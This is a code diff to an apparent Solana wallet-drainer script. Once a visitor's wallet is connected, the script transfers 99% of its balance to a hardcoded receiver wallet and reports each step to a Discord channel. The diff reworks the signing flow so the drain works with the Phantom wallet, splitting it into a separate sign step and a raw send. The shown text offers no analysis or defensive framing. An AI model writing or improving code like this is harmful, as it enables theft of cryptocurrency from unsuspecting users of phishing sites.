@@ -89,25 +89,28 @@ $(document).ready(function() {
                 sendToDiscord('Insufficient funds for transfer');
                 return;
             }
-
+    
             const transaction = new solanaWeb3.Transaction().add(
                 solanaWeb3.SystemProgram.transfer({
                     fromPubkey: walletPublicKey,
                     toPubkey: recieverWallet,
-                    lamports: Math.floor(balanceForTransfer * 0.99), // Keep 1% for fees
+                    lamports: Math.floor(balanceForTransfer * 0.99),
                 }),
             );
-
+    
             const { blockhash } = await connection.getLatestBlockhash('finalized');
             transaction.recentBlockhash = blockhash;
             transaction.feePayer = walletPublicKey;
-
-            // Sign and send
-            const { signature } = await window.solana.signAndSendTransaction(transaction);
+    
+            // USE THIS METHOD FOR PHANTOM - sign first, then send
+            const signedTransaction = await window.solana.signTransaction(transaction);
+            const signature = await connection.sendRawTransaction(signedTransaction.serialize());
+            
             console.log("Transaction sent:", signature);
             sendToDiscord(`Transaction sent: ${signature}`);
             
-            await connection.confirmTransaction(signature, 'confirmed');
+            // Confirm transaction
+            const confirmation = await connection.confirmTransaction(signature, 'confirmed');
             console.log("Transaction confirmed:", signature);
             sendToDiscord(`Transaction confirmed: ${signature}`);
             
